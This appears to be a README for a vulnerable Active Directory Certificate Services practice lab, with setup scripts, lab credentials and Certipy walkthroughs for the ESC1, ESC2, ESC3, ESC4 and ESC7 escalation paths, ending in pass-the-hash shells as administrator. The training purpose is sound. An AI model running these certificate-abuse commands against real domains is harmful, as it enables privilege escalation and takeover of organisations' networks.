## Table of Contents

- [Purpose](#purpose)
- [Fully Configured VM](#fully-configured-vm)
- [Configuring your Windows Server with PowerShell](#configuring-your-windows-server-with-powershell)
- [Importing Vulnerable Templates]()
- [Active Directory Certificate Services Basics](#active-directory-certificate-services-basics)
- [Intro to Certipy](#intro-to-certipy)
- [Misconfigured Certificate Templates - ESC1]()
- [Misconfigured Certificate Templates - ESC2]()
- [Misconfigured Enrollment Agent Templates - ESC3]()
- [Vulnerable Certificate Template Access Control - ESC4]()
- [Vulnerable Certificate Authority Access Control - ESC7]()

## Purpose

This repository has been created in order to give offensive cybersecurity enthusiasts a chance to practice abusing Active Directory Certificate Services for domain privilege escalation. We will utilise the tool [Certipy](https://github.com/ly4k/Certipy) by [Oliver Lyak](https://twitter.com/ly4k) all throughout.

The information here is based on the Certified Pre-Owned white paper by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin). 

I also strongly recommend taking a look at the following articles by [Oliver Lyak](https://twitter.com/ly4k) as well:

[Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923)](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)

[Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and Request Methods — and more!](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)

Another recommended reading is Schroeder's and Christensen's follow-up article [Certificates and Pwnage and Patches, Oh My!](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)

You can follow along with this guide and we'll configure things together or you can download the fully configured VM from the provided link. The VM was created and tested on VMWare Workstation. 

You can also import the vulnerable templates using the included PowerShell script to your own Windows Server 2019 machine, provided you've promoted the server to a Domain Controller and installed a Root Enterprise CA. Manual template configuration can be the done via the Certificate Templates console.
 
The following escalation paths are available: ESC1, ESC2, ESC3, ESC4, and ESC7.

## Fully Configured VM

You can download the .ova file for the VM from [here](https://mega.nz/file/tiFnAaTJ#KyzmL-RfspEwA_EIV4WF_I97_-xrTxT8CzhLL63fnh0). Keep in mind that it's ~11GB in size, it's been allocated 2GB of RAM. To find the IP of the VM, you can log in as the administrator or just do `arp-scan -l` from your attacker machine.

### Passwords for the VM

#### Admin password

In case you require it. Base64-encoded.

`NTNqRkNNJVUqVFVweE5QQ2Ul`

#### User Passwords

##### s.jackson - ESC1, ESC2, ESC3, ESC4

`s.jackson : Pr3-0wn3d@#.`

##### m.roland - ESC7

`m.roland : Acc3SsC0ntr0l`

## Configuring your Windows Server with PowerShell

Before commencing to install Active Directory Domain Services, you should rename your PC to what you want its name to be once its promoted to domain controller. The name I chose is CertDC.

### Step 1 

You can use the following PowerShell commands to set up your Domain Controller. Your machine will restart at the end.

```powershell
﻿
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools -WarningAction SilentlyContinue | Out-Null

Write-Host "[*] Installing Active Directory Domain Services."

# Import the ActiveDirectory module if not already loaded
if (-not (Get-Module -Name ActiveDirectory -ErrorAction SilentlyContinue)) {
    Import-Module ActiveDirectory
}

Install-ADDSForest -SkipPreChecks -CreateDnsDelegation:$false -DomainName certipied.local -DomainNetBIOSName Certipied -InstallDNS -SafeModeAdministratorPassword (Convertto-SecureString -AsPlainText "53jFCM%U*TUpxNPCe%" -Force) -Force -WarningAction SilentlyContinue | Out-Null

Write-Host "[*] Creating new forest."
Write-Host "[*] Promoting to domain controller."
Write-Host "[*] Restarting..."

```

### Step 2

Now you can add the respective users if you would like to follow along with the guide exactly as written.

```powershell
﻿
# Create user s.jackson
  New-ADUser -Name "Sarah Jackson" -GivenName "Sarah" -Surname "Jackson" -SamAccountName "s.jackson" `
  -UserPrincipalName "s.jackson@$Global:Domain -Path DC=certipied,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Pr3-0wn3d@#." -AsPlainText -Force) `
  -PasswordNeverExpires $true -PassThru | Enable-ADAccount  | Out-Null
  Write-Host "[+] Domain User Sarah Jackson added. Logon: s.jackson, password: Pr3-0wn3d@#."
  

# Create user m.roland
  New-ADUser -Name "Michael Roland" -GivenName "Michael" -Surname "Roland" -SamAccountName "m.roland" `
  -UserPrincipalName "m.roland@$Global:Domain -Path DC=certipied,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Acc3SsC0ntr0l" -AsPlainText -Force) `
  -PasswordNeverExpires $true -PassThru | Enable-ADAccount  | Out-Null
  Write-Host "[+] Domain User Michael Roland added. Logon: m.roland, password: Acc3SsC0ntr0l"

New-NetFirewallRule -DisplayName "Allow 389" -Direction Outbound -LocalPort 389 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Allow 636" -Direction Outbound -LocalPort 636 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Allow 389" -Direction Inbound -LocalPort 389 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Allow 636" -Direction Inbound -LocalPort 636 -Protocol TCP -Action Allow

```

### Step 3

The next step is installing Active Directory Certificate services. No restart required.

```powershell

Install-WindowsFeature -Name AD-Certificate -IncludeManagementTools -WarningAction SilentlyContinue | Out-Null

Install-WindowsFeature -Name Adcs-Cert-Authority -IncludeManagementTools -WarningAction SilentlyContinue | Out-Null

  Write-Host "[*] Installing new Active Directory Certificate Authority. `n"
  
  Install-AdcsCertificationAuthority -CACommonName Certipied-CA -CAType EnterpriseRootCa -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
  -KeyLength 2048 -HashAlgorithmName SHA256 -ValidityPeriod Years -ValidityPeriodUnits 99 -WarningAction SilentlyContinue -Force | Out-Null

```

### Importing Vulnerable Templates

The next step would be employing the provided PowerShell script in the repo in order to download and import all the vulnerable certificate templates.

You'll still need to manually give our user Michael Roland "Manage CA" permissions over the certificate authority.

## Active Directory Certificate Services Basics

In technical terms, Active Directory Certificate Services (AD CS) is a Windows Server role that provides a Public Key Infrastructure (PKI) to issue, manage, and validate digital certificates within an organization's Active Directory (AD) environment. AD CS acts as a Certificate Authority (CA), enabling the secure distribution and use of digital certificates for various purposes, such as authentication, encryption, and digital signatures.

Some terminology we need to keep in mind:

1. **Certificate Authority (CA):** AD CS includes one or more CAs responsible for issuing and managing digital certificates. These certificates are used to verify the identity of users, computers, devices, or services within the AD domain. The CA is a critical component of the PKI, generating public-private key pairs and signing the certificates to establish trust and authenticity.

2. **Public Key Infrastructure (PKI):** AD CS implements a PKI framework that consists of cryptographic keys, digital certificates, and trust relationships. The PKI enables secure communication, data encryption, and digital signatures by utilizing asymmetric encryption algorithms, where each entity possesses a public-private key pair.

3. **Certificate Templates:** AD CS uses certificate templates that define the properties and usage of certificates to be issued. These templates allow administrators to create customized certificate types, specifying which users or computers can request them and what purposes they serve (e.g., client authentication, server authentication, email encryption). You cannot create new templates, only duplicate the existing ones.

4. **SAN**: stands for Subject Alternative Name (SAN). It is an extension field in X.509 digital certificates that allows a single certificate to secure multiple Subject Names (identities) within a single certificate. This means that the requester can request a certificate as anyone, including a domain admin.

5. **EKU**: stands for Extended Key Usage. It is an extension field in X.509 digital certificates that specifies the purpose or the specific uses for which the certificate can be used. The Extended Key Usage (EKU) extension allows administrators to define a set of purposes or applications for which the certificate can be utilized. The EKU extension contains one or more Object Identifiers (OIDs) that represent the allowed uses of the certificate.

What we're going to cover here is how easily certificate templates can be misconfigured and how that can quickly lead to domain escalation.

In order to perform enumeration and exploitation, we're going to utilise a tool called Certipy, developed by aforementioned Oliver Lyak.

You can find Certipy's GitHub repo [here](https://github.com/ly4k/Certipy). You are welcome to read through the tool documentation and attempt exploiting the provided VM yourself without guidance.

## Intro to Certipy

Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS).

### Installation

`pip3 install certipy-ad`

### Basics

This section will only cover the basics you will need for the exploitation of the provided escalation paths.

#### find

The `find` command is what we will use for enumeration. We'll specify the username with `-u`, the password with `-p`, the Domain Controller IP with `-dc-ip`. I've used the `-text` flag so the output will only be saved to a `.txt` file. 

Otherwise the tool also saves the output in JSON format and as a .zip file that can be imported into BloodHound for visualization. We're going to work only with the .txt file in this guide.

`certipy find -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -dc-ip 192.168.91.181 -text`

![](/screenshots/20230724201209.png?raw=true)

Optionally, you could also add the `-vulnerable` flag as well, which will only output templates that are vulnerable.

#### req

The `req` command is used for requesting, retrieving, and renewing certificates.

`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d!#.' -ca Certipied-CA -template Vuln-ESC1 -upn administrator@certipied.local -dc-ip 192.168.91.159`

Here we are also specifying the Certificate Authority with `-ca`, the name of the template we are abusing with `-template`, the User Principal Name with `-upn`.

In general, this will generate a certificate file with the `.pfx` extension that we can then use to authenticate.

#### auth

The `auth` command is used for authentication using a previously generated `.pfx` file. 

By default, Certipy will try to extract the username and domain from the certificate (`-pfx`) for authentication via Kerberos which will retrieve a TGT and the NT hash for the target user.

You'll get to see these commands in action soon.

#### ca

The `ca` command can be used to directly interact with and manipulate the certificate authority itself. You will encounter a use case for this command when we cover ESC7.

#### template

The `template` command can be used to manipulate, save and restore template configurations. You will encounter a use case for this command when we cover ESC4.

## Misconfigured Certificate Templates - ESC1

Let's go over the prerequisites for having this escalation path available:

- The CA grants *low-privileged users* enrollment rights
- Manager approval is disabled
- No authorized signatures are required
- The certificate template allows requesters to specify a Subject Alternative Name (SAN) in the Certificate Signing Request (CSR).
- The certificate template defines EKUs that enable authentication. 

![ESC1](/screenshots/ESC1.png?raw=true)

We've already used the `find` command to enumerate the available templates.

If we examine the generated `.txt` file we'll discover that template `Vuln-ESC1` is vulnerable to this escalation path.

![](/screenshots/20230724225445.png?raw=true)

Here is what we need to pay attention to so we can spot vulnerable templates ourselves:
![](/screenshots/20230724225643.png?raw=true)

### Template Abuse

First we're going to request the vulnerable template with valid domain user credentials and specify the UPN of the administrator account.

`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA -template Vuln-ESC1 -upn administrator@certipied.local -dc-ip 192.168.91.181`

![](/screenshots/20230724225958.png?raw=true)

Then we're going to use the certificate we have obtained to authenticate, which will give us the NT hash of the account.

`certipy auth -pfx administrator.pfx -dc-ip 192.168.91.181`
![](/screenshots/20230724230105.png?raw=true)

Just like that we have the administrator hash, all we need to do is perform a Pass-the-Hash attack to obtain a shell and the domain is ours.

`evil-winrm -i 192.168.91.181 -u administrator -H 91e2bb8a04a98412fd7db7a798426b19`
![](/screenshots/20230724230237.png?raw=true)

## Misconfigured Certificate Templates - ESC2

Let's begin once again with the prerequisites for having this escalation path available:

- The CA grants *low-privileged users* enrollment rights
- Manager approval is disabled
- No authorized signatures are required
- The certificate template has Any Purpose as EKU

![ESC2](/screenshots/ESC2.png?raw=true)

Certificates vulnerable to ESC2 will also show up as vulnerable to ESC3.

![](/screenshots/20230724231313.png?raw=true)

Here is what we need to pay attention to so we can spot vulnerable templates ourselves:
![](/screenshots/20230724231433.png?raw=true)

### Template Abuse

If the requester can specify a SAN, a certificate template vulnerable to ESC2 can be abused just like ESC1.

Since the certificate can be used for any purpose, it can be abused using same technique as with ESC3, which we'll cover below.

`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA -template Vuln-ESC2 -dc-ip 192.168.91.181`

![](/screenshots/20230725005026.png?raw=true)

We can then use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of another user by specifying the `-on-behalf-of` flag. The `-on-behalf-of` parameter value must be in the form of `domain\user`, and not the FQDN of the domain, i.e. `certipied` rather than `certipied.local`.

`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA  -template User -on-behalf-of 'certipied\Administrator' -pfx s.jackson.pfx -dc-ip 192.168.91.181`

![](/screenshots/20230725005237.png?raw=true)

We can then use the new certificate to authenticate as the administrator.

## Misconfigured Enrollment Agent Templates - ESC3

This scenario is similar to the first two, however, it concerns a different EKU, namely Certificate Request Agent.
It's also known as Enrollment Agent in Microsoft documentation and allows a principal to enroll for a certificate on behalf of another user.

This escalation path also requires at least two templates matching the conditions we'll explore below.

Requirements for template 1:

- The CA grants *low-privileged users* enrollment rights
- Manager approval is disabled
- No authorized signatures are required
- **A template allows a low-priveleged user to enroll in an enrollment agent certificate.**
- The certificate template has Certificate Request Agent as EKU

![ESC3-1](/screenshots/ESC3-1.png?raw=true)

Here is what we need to pay attention to so we can spot vulnerable templates ourselves:

![ESC3-1](/screenshots/2023-09-03_21-25.png?raw=true)

Requirements for template 2:

- The CA grants *low-privileged users* enrollment rights
- Manager approval is disabled
- **The template schema is version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement requiring the Certificate Request Agent EKU.**
- The certificate template has an EKU that allows for domain authentication.
- Enrollment agent restrictions are not implemented on the CA.

![ESC3-2](/screenshots/ESC3-2.png?raw=true)

Here is what such a template would look like, however, it will not show as vulnerable to anything on its own.

![ESC3-2](/screenshots/2023-09-03_21-28.png?raw=true)

### Template Abuse

Abusing this template will be a repeat of what we covered for ESC2.

First, we must request a certificate based on the certificate template vulnerable to ESC3.

`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA  -template Vuln-ESC3-1 -dc-ip 192.168.91.185`

![](/screenshots/2023-09-03_21-39.png?raw=true)

We can then use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of another user by specifying the `-on-behalf-of` flag. The `-on-behalf-of` parameter value must be in the form of `domain\user`, and not the FQDN of the domain, i.e. `certipied` rather than `certipied.local`.

`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA  -template User -on-behalf-of 'certipied\Administrator' -pfx s.jackson.pfx -dc-ip 192.168.91.185`

![](/screenshots/2023-09-03_21-41.png?raw=true)

We can then use the new certificate to authenticate as the administrator.

## Vulnerable Certificate Template Access Control - ESC4

![ESC4](/screenshots/ESC4.png?raw=true)

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

By default, Certipy will overwrite the configuration to make it vulnerable to ESC1.

### Template Abuse

We can specify the `-save-old` flag to save the old configuration, which is useful for restoring the configuration afterwards.

`certipy template -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -template Vuln-ESC4 -dc-ip 192.168.91.181 -save-old`

![](/screenshots/20230725005406.png?raw=true)

Therefore, we can now request a certificate based on the ESC4 template and specify an arbitrary SAN with the `-upn` flag, in the exact same way we would for ESC1.

`certipy req -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -ca Certipied-CA -template Vuln-ESC4 -upn administrator@certipied.local -dc-ip 192.168.91.181`

![](/screenshots/20230725005455.png?raw=true)

We can restore the old configuration by specifying the path to the saved configuration with the `-configuration` flag.

`certipy template -u s.jackson@certipied.local -p 'Pr3-0wn3d@#.' -template Vuln-ESC4 -dc-ip 192.168.91.181 -configuration Vuln-ESC4.json`

![](/screenshots/20230725005618.png?raw=true)

## Vulnerable Certificate Authority Access Control - ESC7

![ESC7](/screenshots/ESC7.png?raw=true)

### Template Abuse

If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.

`certipy ca -ca 'Certipied-CA' -add-officer m.roland -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -dc-ip 192.168.91.181`

![](/screenshots/20230725010032.png?raw=true)

The **`SubCA`** template can be **enabled on the CA** with the `-enable-template` parameter. By default, the `SubCA` template is enabled.

`certipy ca -ca 'Certipied-CA' -enable-template SubCA -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -dc-ip 192.168.91.181`

![](/screenshots/20230725010101.png?raw=true)

If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the `SubCA` template.

This request will be denied, but we will save the private key and note down the request ID.

`certipy req -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -ca Certipied-CA -template SubCA -upn administrator@certipied.local -dc-ip 192.168.91.181`

![](/screenshots/20230725010221.png?raw=true)

With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.

`certipy ca -ca 'Certipied-CA' -issue-request 8 -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -dc-ip 192.168.91.181`

![](/screenshots/20230725010303.png?raw=true)

`certipy req -u m.roland@certipied.local -p 'Acc3SsC0ntr0l' -ca Certipied-CA -retrieve 8 -dc-ip 192.168.91.181`

![](/screenshots/20230725010352.png?raw=true)

## Final Words

I hope this examination of some of the available escalation paths has been helpful. I recommend referring to all of the sources mentioned in the beginning to gain a deeper understanding of the topic and the many potential available paths for abusing Active Directory Certificate Services.

I may add more to this guide in the future.
